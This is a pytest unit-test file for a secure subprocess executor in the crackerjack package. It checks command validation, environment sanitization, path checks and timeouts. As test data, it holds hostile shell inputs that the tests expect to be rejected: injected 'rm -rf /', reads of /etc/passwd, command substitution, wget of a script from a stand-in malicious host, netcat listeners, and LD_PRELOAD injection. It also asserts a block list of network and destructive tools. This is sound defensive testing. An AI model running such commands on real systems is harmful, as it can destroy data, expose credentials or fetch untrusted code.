"""Unit tests for SecureSubprocessExecutor.

Tests security-critical subprocess execution functionality including
command validation, environment sanitization, and dangerous pattern detection.
"""

import os
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from crackerjack.services.secure_subprocess import (
    CommandValidationError,
    EnvironmentValidationError,
    SecureSubprocessExecutor,
    SubprocessSecurityConfig,
    get_secure_executor,
)


@pytest.mark.unit
@pytest.mark.security
class TestSubprocessSecurityConfig:
    """Test security configuration for subprocess execution."""

    def test_default_config_values(self):
        """Test default security configuration values."""
        config = SubprocessSecurityConfig()

        assert config.max_command_length == 10000
        assert config.max_arg_length == 4096
        assert config.max_env_var_length == 32768
        assert config.max_env_vars == 1000
        assert config.max_timeout == 3600
        assert config.enable_path_validation is True
        assert config.enable_command_logging is True

    def test_custom_config_values(self):
        """Test custom security configuration values."""
        config = SubprocessSecurityConfig(
            max_command_length=5000,
            max_arg_length=2048,
            max_timeout=1800,
            enable_path_validation=False,
        )

        assert config.max_command_length == 5000
        assert config.max_arg_length == 2048
        assert config.max_timeout == 1800
        assert config.enable_path_validation is False

    def test_blocked_executables_default(self):
        """Test default blocked executables list."""
        config = SubprocessSecurityConfig()

        # Check critical dangerous commands are blocked
        assert "rm" in config.blocked_executables
        assert "sudo" in config.blocked_executables
        assert "curl" in config.blocked_executables
        assert "wget" in config.blocked_executables
        assert "nc" in config.blocked_executables
        assert "eval" in config.blocked_executables

    def test_custom_allowed_executables(self):
        """Test custom allowed executables whitelist."""
        allowed = {"git", "python", "pytest"}
        config = SubprocessSecurityConfig(allowed_executables=allowed)

        assert config.allowed_executables == allowed

    def test_custom_blocked_executables(self):
        """Test custom blocked executables blacklist."""
        blocked = {"custom_dangerous_cmd"}
        config = SubprocessSecurityConfig(blocked_executables=blocked)

        assert config.blocked_executables == blocked


@pytest.mark.unit
@pytest.mark.security
class TestSecureSubprocessExecutorValidation:
    """Test command validation logic."""

    @pytest.fixture
    def executor(self):
        """Create executor with logging disabled for tests."""
        config = SubprocessSecurityConfig(enable_command_logging=False)
        return SecureSubprocessExecutor(config)

    def test_validate_command_empty_raises_error(self, executor):
        """Test validation fails for empty command."""
        with pytest.raises(CommandValidationError, match="Command cannot be empty"):
            executor._validate_command([])

    def test_validate_command_too_long_raises_error(self, executor):
        """Test validation fails for excessively long command."""
        # Create command that exceeds max_command_length
        long_arg = "x" * 15000
        command = ["echo", long_arg]

        with pytest.raises(CommandValidationError, match="Command too long"):
            executor._validate_command(command)

    def test_validate_command_arg_too_long_filters_it(self, executor):
        """Test validation filters arguments that are too long."""
        # Argument exceeds max_arg_length (4096)
        long_arg = "x" * 5000
        command = ["echo", long_arg, "normal"]

        with pytest.raises(CommandValidationError):
            executor._validate_command(command)

    def test_validate_command_dangerous_patterns_rejected(self, executor):
        """Test dangerous shell patterns are rejected."""
        dangerous_commands = [
            ["echo", "test; rm -rf /"],  # Command chaining
            ["echo", "test | cat"],  # Pipe
            ["echo", "test && evil"],  # Logical AND
            ["echo", "`whoami`"],  # Command substitution backticks
            ["echo", "$(whoami)"],  # Command substitution $()
            ["echo", "../../../etc/passwd"],  # Path traversal
        ]

        for cmd in dangerous_commands:
            with pytest.raises(CommandValidationError):
                executor._validate_command(cmd)

    def test_validate_command_safe_command_passes(self, executor):
        """Test safe commands pass validation."""
        safe_commands = [
            ["python", "-m", "pytest"],
            ["git", "status"],
            ["ls", "-la"],
            ["echo", "Hello World"],
        ]

        for cmd in safe_commands:
            # Should not raise
            validated = executor._validate_command(cmd)
            assert len(validated) > 0

    def test_validate_command_git_refs_allowed(self, executor):
        """Test git reference patterns are allowed."""
        # Git uses special characters that should be allowed
        git_commands = [
            ["git", "log", "@{u}..HEAD"],
            ["git", "log", "@{upstream}..HEAD"],
            ["git", "log", "HEAD..@{u}"],
            ["git", "reflog", "@{1}"],
            ["git", "log", "@{1 day ago}"],
        ]

        for cmd in git_commands:
            # Should not raise for valid git refs
            validated = executor._validate_command(cmd)
            assert len(validated) > 0

    def test_validate_command_blocked_executable(self, executor):
        """Test blocked executables are rejected."""
        blocked_commands = [
            ["rm", "-rf", "/tmp/test"],
            ["sudo", "apt-get", "install"],
            ["curl", "http://malicious.com"],
            ["wget", "http://malicious.com/script.sh"],
            ["nc", "-l", "1234"],
        ]

        for cmd in blocked_commands:
            with pytest.raises(CommandValidationError, match="blocked"):
                executor._validate_command(cmd)

    def test_validate_command_allowed_executable_only(self):
        """Test allowlist enforcement."""
        config = SubprocessSecurityConfig(
            allowed_executables={"git", "python"},
            enable_command_logging=False,
        )
        executor = SecureSubprocessExecutor(config)

        # Allowed executable should pass
        validated = executor._validate_command(["git", "status"])
        assert validated == ["git", "status"]

        # Non-allowed executable should fail
        with pytest.raises(CommandValidationError, match="not in allowlist"):
            executor._validate_command(["ls", "-la"])

    def test_validate_command_git_commit_message_special_chars(self, executor):
        """Test git commit messages can contain parentheses."""
        # Commit messages often contain parentheses which should be allowed
        cmd = ["git", "commit", "-m", "feat(core): add new feature"]

        validated = executor._validate_command(cmd)
        assert validated == cmd


@pytest.mark.unit
@pytest.mark.security
class TestSecureSubprocessExecutorEnvironment:
    """Test environment sanitization."""

    @pytest.fixture
    def executor(self):
        """Create executor with logging disabled."""
        config = SubprocessSecurityConfig(enable_command_logging=False)
        return SecureSubprocessExecutor(config)

    def test_sanitize_environment_removes_dangerous_vars(self, executor):
        """Test dangerous environment variables are removed."""
        dangerous_env = {
            "HOME": "/home/user",
            "LD_PRELOAD": "/malicious/lib.so",
            "PYTHONPATH": "/injected/path",
            "DYLD_INSERT_LIBRARIES": "/bad/dylib",
        }

        sanitized = executor._sanitize_environment(dangerous_env)

        # Dangerous vars should be removed
        assert "LD_PRELOAD" not in sanitized
        assert "PYTHONPATH" not in sanitized
        assert "DYLD_INSERT_LIBRARIES" not in sanitized

        # Safe vars should remain
        assert sanitized["HOME"] == "/home/user"

    def test_sanitize_environment_adds_safe_vars(self, executor, monkeypatch):
        """Test safe environment variables are added."""
        monkeypatch.setenv("HOME", "/home/test")
        monkeypatch.setenv("USER", "testuser")

        # Start with minimal environment
        sanitized = executor._sanitize_environment({})

        # Safe vars should be added from os.environ
        assert "HOME" in sanitized
        assert "USER" in sanitized

    def test_sanitize_environment_filters_long_values(self, executor):
        """Test environment values exceeding max length are filtered."""
        long_value = "x" * 40000  # Exceeds max_env_var_length (32768)
        env = {
            "HOME": "/home/user",
            "LONG_VAR": long_value,
        }

        sanitized = executor._sanitize_environment(env)

        # Long value should be filtered
        assert "LONG_VAR" not in sanitized
        assert "HOME" in sanitized

    def test_sanitize_environment_filters_injection_patterns(self, executor):
        """Test environment values with injection patterns are filtered."""
        env = {
            "SAFE_VAR": "normal_value",
            "INJECT_1": "value; rm -rf /",
            "INJECT_2": "value | cat /etc/passwd",
            "INJECT_3": "value`whoami`",
        }

        sanitized = executor._sanitize_environment(env)

        # Injection patterns should be filtered
        assert "INJECT_1" not in sanitized
        assert "INJECT_2" not in sanitized
        assert "INJECT_3" not in sanitized
        assert "SAFE_VAR" in sanitized

    def test_sanitize_environment_too_many_vars(self, executor):
        """Test validation fails with too many environment variables."""
        # Create more vars than max_env_vars (1000)
        large_env = {f"VAR_{i}": f"value_{i}" for i in range(1100)}

        with pytest.raises(EnvironmentValidationError, match="Too many environment"):
            executor._sanitize_environment(large_env)

    def test_sanitize_environment_defaults_to_os_environ(self, executor):
        """Test None environment defaults to os.environ copy."""
        sanitized = executor._sanitize_environment(None)

        # Should be a sanitized copy of os.environ
        assert isinstance(sanitized, dict)
        # Dangerous vars should be removed even from os.environ
        assert "LD_PRELOAD" not in sanitized


@pytest.mark.unit
@pytest.mark.security
class TestSecureSubprocessExecutorPathValidation:
    """Test working directory validation."""

    @pytest.fixture
    def executor(self):
        """Create executor with logging disabled."""
        config = SubprocessSecurityConfig(enable_command_logging=False)
        return SecureSubprocessExecutor(config)

    def test_validate_cwd_none_returns_none(self, executor):
        """Test None working directory passes through."""
        assert executor._validate_cwd(None) is None

    def test_validate_cwd_valid_path(self, executor, tmp_path):
        """Test validation of valid working directory."""
        validated = executor._validate_cwd(tmp_path)

        assert isinstance(validated, Path)
        assert validated.exists()

    def test_validate_cwd_string_path(self, executor, tmp_path):
        """Test validation works with string paths."""
        validated = executor._validate_cwd(str(tmp_path))

        assert isinstance(validated, Path)
        assert validated == tmp_path

    def test_validate_cwd_dangerous_system_paths(self, executor):
        """Test dangerous system paths are rejected."""
        dangerous_paths = [
            "/etc",
            "/usr/bin",
            "/bin",
            "/sbin",
        ]

        for path in dangerous_paths:
            with pytest.raises(CommandValidationError, match="Dangerous working directory"):
                executor._validate_cwd(path)

    def test_validate_cwd_path_traversal_rejected(self, executor, tmp_path):
        """Test path traversal patterns are rejected."""
        # Try to use .. in resolved path
        dangerous_path = tmp_path / ".." / ".." / "etc"

        with pytest.raises(CommandValidationError):
            executor._validate_cwd(dangerous_path)

    def test_validate_cwd_disabled_validation(self, tmp_path):
        """Test path validation can be disabled."""
        config = SubprocessSecurityConfig(
            enable_path_validation=False,
            enable_command_logging=False,
        )
        executor = SecureSubprocessExecutor(config)

        # Even dangerous path should pass when validation disabled
        result = executor._validate_cwd("/etc")
        assert isinstance(result, Path)


@pytest.mark.unit
@pytest.mark.security
class TestSecureSubprocessExecutorTimeout:
    """Test timeout validation."""

    @pytest.fixture
    def executor(self):
        """Create executor with logging disabled."""
        config = SubprocessSecurityConfig(enable_command_logging=False)
        return SecureSubprocessExecutor(config)

    def test_validate_timeout_none_returns_none(self, executor):
        """Test None timeout passes through."""
        assert executor._validate_timeout(None) is None

    def test_validate_timeout_valid(self, executor):
        """Test valid timeout is accepted."""
        assert executor._validate_timeout(30.0) == 30.0
        assert executor._validate_timeout(300.0) == 300.0

    def test_validate_timeout_negative_rejected(self, executor):
        """Test negative timeout is rejected."""
        with pytest.raises(CommandValidationError, match="must be positive"):
            executor._validate_timeout(-1.0)

    def test_validate_timeout_zero_rejected(self, executor):
        """Test zero timeout is rejected."""
        with pytest.raises(CommandValidationError, match="must be positive"):
            executor._validate_timeout(0.0)

    def test_validate_timeout_too_large_rejected(self, executor):
        """Test timeout exceeding maximum is rejected."""
        # max_timeout is 3600 by default
        with pytest.raises(CommandValidationError, match="Timeout too large"):
            executor._validate_timeout(5000.0)

    def test_validate_timeout_at_max_allowed(self, executor):
        """Test timeout at exactly maximum is allowed."""
        # max_timeout is 3600
        assert executor._validate_timeout(3600.0) == 3600.0


@pytest.mark.unit
@pytest.mark.security
class TestSecureSubprocessExecutorExecution:
    """Test actual subprocess execution (mocked)."""

    @pytest.fixture
    def executor(self):
        """Create executor with logging disabled."""
        config = SubprocessSecurityConfig(enable_command_logging=False)
        return SecureSubprocessExecutor(config)

    @patch("crackerjack.services.secure_subprocess.subprocess.run")
    def test_execute_secure_success(self, mock_run, executor):
        """Test successful command execution."""
        mock_result = subprocess.CompletedProcess(
            args=["echo", "test"],
            returncode=0,
            stdout="test\n",
            stderr="",
        )
        mock_run.return_value = mock_result

        result = executor.execute_secure(["echo", "test"])

        assert result.returncode == 0
        assert result.stdout == "test\n"
        mock_run.assert_called_once()

    @patch("crackerjack.services.secure_subprocess.subprocess.run")
    def test_execute_secure_with_cwd(self, mock_run, executor, tmp_path):
        """Test execution with working directory."""
        mock_result = subprocess.CompletedProcess(
            args=["ls"],
            returncode=0,
            stdout="",
            stderr="",
        )
        mock_run.return_value = mock_result

        result = executor.execute_secure(["ls"], cwd=tmp_path)

        assert result.returncode == 0
        # Verify cwd was passed to subprocess.run
        call_kwargs = mock_run.call_args.kwargs
        assert call_kwargs["cwd"] == tmp_path

    @patch("crackerjack.services.secure_subprocess.subprocess.run")
    def test_execute_secure_with_custom_env(self, mock_run, executor):
        """Test execution with custom environment."""
        mock_result = subprocess.CompletedProcess(
            args=["env"],
            returncode=0,
            stdout="",
            stderr="",
        )
        mock_run.return_value = mock_result

        custom_env = {"CUSTOM_VAR": "value"}
        result = executor.execute_secure(["env"], env=custom_env)

        assert result.returncode == 0
        # Verify environment was sanitized and passed
        call_kwargs = mock_run.call_args.kwargs
        assert "CUSTOM_VAR" in call_kwargs["env"]

    @patch("crackerjack.services.secure_subprocess.subprocess.run")
    def test_execute_secure_with_timeout(self, mock_run, executor):
        """Test execution with timeout."""
        mock_result = subprocess.CompletedProcess(
            args=["sleep", "1"],
            returncode=0,
            stdout="",
            stderr="",
        )
        mock_run.return_value = mock_result

        result = executor.execute_secure(["sleep", "1"], timeout=5.0)

        assert result.returncode == 0
        # Verify timeout was passed
        call_kwargs = mock_run.call_args.kwargs
        assert call_kwargs["timeout"] == 5.0

    def test_execute_secure_validates_command(self, executor):
        """Test execution validates command before running."""
        # Dangerous command should be rejected before execution
        with pytest.raises(CommandValidationError):
            executor.execute_secure(["rm", "-rf", "/"])

    def test_execute_secure_validates_timeout(self, executor):
        """Test execution validates timeout before running."""
        with pytest.raises(CommandValidationError):
            executor.execute_secure(["echo", "test"], timeout=-1.0)

    @patch("crackerjack.services.secure_subprocess.subprocess.run")
    def test_execute_secure_handles_subprocess_error(self, mock_run, executor):
        """Test handling of subprocess execution errors."""
        mock_run.side_effect = subprocess.CalledProcessError(
            returncode=1,
            cmd=["false"],
            stderr="error",
        )

        with pytest.raises(subprocess.CalledProcessError):
            executor.execute_secure(["false"], check=True)


@pytest.mark.unit
@pytest.mark.security
class TestGlobalExecutor:
    """Test global executor singleton."""

    def test_get_secure_executor_returns_singleton(self):
        """Test global executor is a singleton."""
        # Reset global executor
        import crackerjack.services.secure_subprocess as module
        module._global_executor = None

        executor1 = get_secure_executor()
        executor2 = get_secure_executor()

        assert executor1 is executor2

    def test_get_secure_executor_with_config(self):
        """Test creating global executor with custom config."""
        # Reset global executor
        import crackerjack.services.secure_subprocess as module
        module._global_executor = None

        config = SubprocessSecurityConfig(max_timeout=1000)
        executor = get_secure_executor(config)

        assert executor.config.max_timeout == 1000

    def test_get_secure_executor_respects_debug_env(self, monkeypatch):
        """Test executor respects CRACKERJACK_DEBUG environment variable."""
        # Reset global executor
        import crackerjack.services.secure_subprocess as module
        module._global_executor = None

        monkeypatch.setenv("CRACKERJACK_DEBUG", "1")
        executor = get_secure_executor()

        assert executor.config.enable_command_logging is True


@pytest.mark.unit
@pytest.mark.security
class TestSecurityPatterns:
    """Test security pattern detection."""

    @pytest.fixture
    def executor(self):
        """Create executor with logging disabled."""
        config = SubprocessSecurityConfig(enable_command_logging=False)
        return SecureSubprocessExecutor(config)

    def test_dangerous_patterns_defined(self, executor):
        """Test dangerous patterns are properly defined."""
        assert len(executor.dangerous_patterns) > 0
        # Check key patterns
        assert any(";" in pattern for pattern in executor.dangerous_patterns)
        assert any("|" in pattern for pattern in executor.dangerous_patterns)
        assert any("`" in pattern for pattern in executor.dangerous_patterns)

    def test_allowed_git_patterns_defined(self, executor):
        """Test allowed git patterns are defined."""
        assert len(executor.allowed_git_patterns) > 0

    def test_dangerous_env_vars_defined(self, executor):
        """Test dangerous environment variables are listed."""
        assert "LD_PRELOAD" in executor.dangerous_env_vars
        assert "PYTHONPATH" in executor.dangerous_env_vars
        assert "DYLD_INSERT_LIBRARIES" in executor.dangerous_env_vars

    def test_safe_env_vars_defined(self, executor):
        """Test safe environment variables are listed."""
        assert "HOME" in executor.safe_env_vars
        assert "USER" in executor.safe_env_vars
        assert "LANG" in executor.safe_env_vars
